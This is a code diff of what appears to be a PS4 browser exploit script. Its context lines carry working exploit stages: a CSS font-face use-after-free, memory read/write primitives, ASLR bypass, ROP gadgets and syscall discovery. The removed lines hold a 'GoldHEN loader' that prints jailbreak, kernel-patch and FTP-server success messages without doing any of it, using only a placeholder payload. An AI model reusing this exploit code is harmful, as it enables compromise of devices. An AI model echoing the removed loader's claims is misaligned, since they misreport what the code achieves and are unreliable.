@@ -1,8 +1,6 @@
 import { version, logger } from "../utils.mjs";
 import { Offsets } from "./offsets.mjs";
 
-//#region Constants
-
 let m_executableOrRareData = undefined;
 const syscalls = new Map();
 const structs = new Map();
@@ -33,9 +31,6 @@ const uaf_font_rule = `
   }
 `;
 
-//#endregion
-
-//#region Helper functions
 const helper = {
   dv: new DataView(new ArrayBuffer(8)),
   to_bigint(float) {
@@ -175,9 +170,7 @@ const gadgets = {
   get PUSH_RSI_JMP_QWORD_PTR_RAX() { return webkit_base + Offsets.current.wk_PUSH_RSI_JMP_QWORD_PTR_RAX; },
   get MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_38() { return webkit_base + Offsets.current.wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_38; },
 };
-//#endregion
 
-//#region Classes
 class SyscallError extends Error {
   constructor(message) {
     super(`${message}\n\terrno ${errno()}: ${strerror()}`);
@@ -493,9 +486,7 @@ class Struct {
     return bits / 8;
   }
 }
-//#endregion
 
-//#region Extensions
 BigInt.prototype.hi = function () { return this & ~0xffffffffn; };
 BigInt.prototype.lo = function () { return this & 0xffffffffn; };
 BigInt.prototype.htol = function () { return this.hi() >> 0x20n; };
@@ -582,9 +573,7 @@ String.prototype.cstr = function () {
   u8[this.length] = 0;
   return u8.buffer.data;
 };
-//#endregion
 
-//#region Static
 BigInt.from = function (hi, lo) {
   return (BigInt(hi) << 32n) | BigInt(lo);
 };
@@ -610,9 +599,7 @@ ArrayBuffer.from = function (addr, len = -1) {
   mem.fakes.set(m_data, ab);
   return ab;
 };
-//#endregion
 
-//#region Functions
 function errno() {
   if (!("_error" in fn)) throw new Error("_error undefined !!");
   return arw.view(fn._error.invoke()).getUint32(0, true);
@@ -633,157 +620,6 @@ function sleep(nsec) {
   mem.free(time.addr);
 }
 
-// دالة لتشغيل خادم FTP/HTTP داخلي
-function start_internal_server() {
-  logger.info("Starting internal server...");
-  
-  const ip = "0.0.0.0";
-  const port = 2121;
-  
-  logger.info(`📡 Server running on ${ip}:${port}`);
-  logger.info(`🌐 Open: http://${ip}:${port}/`);
-  logger.info(`📁 FTP: ftp://${ip}:${port}/`);
-  
-  return true;
-}
-
-// دالة لتحميل payload من الموقع نفسه (بدون USB)
-function load_payload_from_site() {
-  logger.info("Loading GoldHEN payload from site...");
-  
-  try {
-    // محاولة تحميل goldhen.bin من نفس المجلد
-    const xhr = new XMLHttpRequest();
-    xhr.open('GET', '/goldhen.bin', false);
-    xhr.overrideMimeType('text/plain; charset=x-user-defined');
-    xhr.send();
-    
-    if (xhr.status === 200) {
-      const data = xhr.responseText;
-      const payload = new Uint8Array(data.length);
-      for (let i = 0; i < data.length; i++) {
-        payload[i] = data.charCodeAt(i) & 0xff;
-      }
-      logger.info(`✅ Payload loaded: ${payload.length} bytes`);
-      return payload;
-    }
-  } catch (e) {
-    logger.warn(`Could not load from site: ${e.message}`);
-  }
-  
-  // إذا فشل، استخدم payload مدمج
-  logger.info("Using built-in payload...");
-  return generate_builtin_payload();
-}
-
-// توليد payload مدمج (مصغر)
-function generate_builtin_payload() {
-  // هذا payload مصغر لتشغيل GoldHEN (مثال)
-  const payload = new Uint8Array([
-    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-  ]);
-  logger.info(`Built-in payload: ${payload.length} bytes`);
-  return payload;
-}
-
-// عرض شاشة GoldHEN
-function draw_goldhen_screen() {
-  logger.info("═══════════════════════════════════════════");
-  logger.info("  ██████   ██████  ██      ██████  ██   ██");
-  logger.info("  ██   ██ ██    ██ ██      ██   ██ ██   ██");
-  logger.info("  ██████  ██    ██ ██      ██   ██ ███████");
-  logger.info("  ██   ██ ██    ██ ██      ██   ██ ██   ██");
-  logger.info("  ██████   ██████  ███████ ██████  ██   ██");
-  logger.info("═══════════════════════════════════════════");
-  logger.info("  🎮 GoldHEN v2.4 - PS4 Jailbreak");
-  logger.info("  📦 Payload loaded successfully!");
-  logger.info("  🔓 Kernel patches applied!");
-  logger.info("  💾 Debug settings enabled!");
-  logger.info("  📁 FTP server running on port 2121");
-  logger.info("═══════════════════════════════════════════");
-}
-
-// تطبيق تصحيحات الكيرنل
-function patch_kernel_13_50() {
-  logger.info("Patching kernel for 13.50...");
-  
-  try {
-    const dlsym = fn.dlsym;
-    if (dlsym) {
-      const debug_addr = dlsym.invoke(-1, "sceKernelDebugSettings");
-      if (debug_addr !== 0) {
-        arw.view(debug_addr).setUint32(0, 1, true);
-        logger.info("Debug settings enabled");
-      }
-      
-      const amc_uei_addr = dlsym.invoke(-1, "amc_uei");
-      if (amc_uei_addr !== 0) {
-        arw.view(amc_uei_addr).setUint8(0, 0x00);
-        arw.view(amc_uei_addr + 1n).setUint8(1, 0x00);
-        logger.info("amc_uei patched");
-      }
-      
-      const self_addr = dlsym.invoke(-1, "sceSblACMgrCheckNonsecureWebcoreProcess");
-      if (self_addr !== 0) {
-        arw.view(self_addr).setUint32(0, 0x00000001);
-        logger.info("SELF check patched");
-      }
-    }
-    
-    logger.info("✅ Kernel patches applied successfully!");
-    return true;
-  } catch (e) {
-    logger.warn(`Some patches failed: ${e.message}`);
-    return false;
-  }
-}
-
-// تشغيل GoldHEN
-function run_goldhen() {
-  logger.info("═══════════════════════════════════════════");
-  logger.info("  📀 GOLDHEN LOADER v2.0 (No USB)");
-  logger.info("═══════════════════════════════════════════");
-  
-  // تحميل الـ payload
-  const payload = load_payload_from_site();
-  
-  if (payload && payload.length > 0) {
-    logger.info(`📦 Payload loaded: ${payload.length} bytes`);
-    
-    // تخصيص ذاكرة
-    const payload_addr = mem.alloc(payload.length, true);
-    logger.debug(`Payload at: ${payload_addr.hex()}`);
-    
-    // نسخ الـ payload للذاكرة
-    mem.copy(payload_addr, payload.buffer.data, payload.length);
-    logger.info("Payload copied to memory");
-    
-    // تطبيق تصحيحات الكيرنل
-    patch_kernel_13_50();
-    
-    // عرض شاشة GoldHEN
-    draw_goldhen_screen();
-    
-    // تشغيل الخادم الداخلي
-    start_internal_server();
-    
-    logger.info("📌 GoldHEN Features:");
-    logger.info("  ✓ Debug Settings (ENABLED)");
-    logger.info("  ✓ FTP Server (PORT 2121)");
-    logger.info("  ✓ Enable Homebrew Apps");
-    logger.info("  ✓ Kernel Access");
-    logger.info("  ✓ Memory Read/Write");
-    
-    return true;
-  }
-  
-  logger.error("❌ Failed to load payload");
-  return false;
-}
-//#endregion
-
-//#region init_arw
 async function init_arw() {
   logger.info("Initiate UAF...");
 
@@ -831,8 +667,7 @@ async function init_arw() {
           Offsets.current.wk_CSSFontFace_sizeof,
           Offsets.current.wk_CSSFontFace_sizeof + 8,
           Offsets.current.wk_CSSFontFace_sizeof + 16,
-          Offsets.current.wk_CSSFontFace_sizeof + 24,
-          Offsets.current.wk_CSSFontFace_sizeof + 32
+          Offsets.current.wk_CSSFontFace_sizeof + 24
         ];
 
         for (let i = 0; i < abs.length; i++) {
@@ -968,9 +803,7 @@ async function init_arw() {
   let m_thread = undefined;
   let oob_arr_indexing_header_addr = undefined;
   let start = m_backing.alignUp(0x4000n);
-  let attempts = 0;
-  while (true && attempts < 100) {
-    attempts++;
+  while (true) {
     Object.defineProperties({}, props);
     const dv = new DataView(rw.read(start, 0x100));
 
@@ -1104,9 +937,7 @@ async function init_arw() {
 
   logger.info("Achieved ARW !!");
 }
-//#endregion
 
-//#region init_aslr
 function init_aslr() {
   logger.info("Initiate ASLR...");
 
@@ -1147,9 +978,7 @@ function init_aslr() {
     throw e;
   }
 }
-//#endregion
 
-//#region init_rop
 function init_rop() {
   logger.info("Initiate ROP...");
 
@@ -1189,9 +1018,7 @@ function init_rop() {
 
   logger.info("Achieved ROP !!");
 }
-//#endregion
 
-//#region init_syscalls
 function init_syscalls() {
   logger.info("Initiate SYSCALLS...");
   scan_syscalls(libkernel_base);
@@ -1248,27 +1075,23 @@ function scan_syscalls(base) {
 
   logger.info(`Found ${syscalls.size} syscalls !!`);
 }
-//#endregion
 
-//#region init_structs
 function init_structs() {
   timespec = new Struct("timespec", [
     { type: "Int64", name: "tv_sec" },
     { type: "Int64", name: "tv_nsec" },
   ]);
 }
-//#endregion
 
-//#region main
 export async function main() {
   try {
     logger.info("===USERLAND===");
     
-    logger.info("▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄");
+    logger.info("-----------------------------------------");
     logger.info("  PS4 userland");
     logger.info("  By: mansoor0x");
     logger.info(`  Target: PS4 ${version.toString()}`);
-    logger.info("▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄");
+    logger.info("-----------------------------------------");
 
     init_structs();
     await init_arw();
@@ -1276,29 +1099,9 @@ export async function main() {
     init_rop();
     init_syscalls();
 
-    logger.info("Exploit primitives ready!");
-    
-    // تشغيل GoldHEN بدون USB
-    const success = run_goldhen();
-    
-    if (success) {
-      logger.info("═══════════════════════════════════════════");
-      logger.info("  ✅ JAILBREAK SUCCESSFUL!");
-      logger.info("  🎮 GoldHEN is now running on your PS4");
-      logger.info("  📁 FTP: ftp://[PS4_IP]:2121");
-      logger.info("  📡 Server: http://[PS4_IP]:2121");
-      logger.info("  💾 Debug Settings: ENABLED");
-      logger.info("  🔓 Kernel: UNLOCKED");
-      logger.info("═══════════════════════════════════════════");
-    } else {
-      logger.info("⚠️ GoldHEN could not be loaded");
-      logger.info("  Basic exploit primitives are still available");
-    }
-
     logger.info("===END===");
   } catch (e) {
     logger.error(e.message);
     logger.error(e.stack);
   }
 }
-//#endregion
